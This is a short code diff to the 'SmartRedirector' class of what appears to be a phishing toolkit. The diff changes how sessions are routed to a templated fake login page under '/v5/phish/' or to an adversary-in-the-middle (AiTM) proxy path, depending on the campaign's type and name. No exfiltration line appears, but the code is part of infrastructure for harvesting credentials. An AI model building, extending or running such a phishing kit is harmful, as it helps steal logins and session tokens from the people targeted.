@@ -188,8 +188,15 @@ class SmartRedirector:
         # 2) Mode de campagne choisi: 'aitm' => AiTM, 'template' => template
         # 3) Par défaut => template
         if not template_override:
-            if campaign and campaign.get("type") == "template":
-                redirect_to = f"/v5/phish/{campaign_id}/login?sid={session_id}"
+            if campaign:
+                ctype = str(campaign.get("type", "") or "").lower()
+                cname = str(campaign.get("name", "") or "")
+                if ctype == "template":
+                    redirect_to = f"/v5/phish/{campaign_id}/login?sid={session_id}"
+                elif "aitm" in cname.lower():
+                    redirect_to = f"/v5/p/{session_id}/"
+                else:
+                    redirect_to = f"/v5/p/{session_id}/"
             else:
                 redirect_to = f"/v5/p/{session_id}/"
         
